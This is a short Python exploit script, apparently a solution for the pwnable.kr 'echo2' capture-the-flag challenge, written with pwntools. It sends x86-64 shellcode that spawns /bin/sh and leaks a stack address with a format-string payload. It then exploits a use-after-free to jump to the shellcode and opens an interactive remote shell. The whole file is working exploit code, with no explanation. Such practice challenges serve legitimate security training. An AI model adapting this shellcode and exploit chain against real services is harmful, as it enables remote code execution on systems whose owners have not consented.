from pwn import *

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
#sh = process(b"./echo2")
sh = remote(b"pwnable.kr", b"9011")
#gdb.attach(sh)

def start(name):
    sh.recv()
    sh.sendline(name)
    sh.recv()


def FSB(payload):
    sh.sendline(b"2")
    sh.recv()
    sh.sendline(payload)
    return sh.recvuntil(b"> ")

def UAF(payload):
    sh.sendline(b"3")
    sh.recv()
    sh.sendline(payload)
    sh.recv() 

def exit():
    sh.sendline(b"4")
    sh.recv()
    sh.sendline(b"n")
    sh.recv() 



start(shellcode)

stack_target = p64(int(FSB(b"%12$p").split(b"0x")[1].split(b"\n")[0], 16) -0x20)
exit()
UAF(b"A"*24+stack_target)
sh.sendline(b"3") # UAF again

sh.interactive()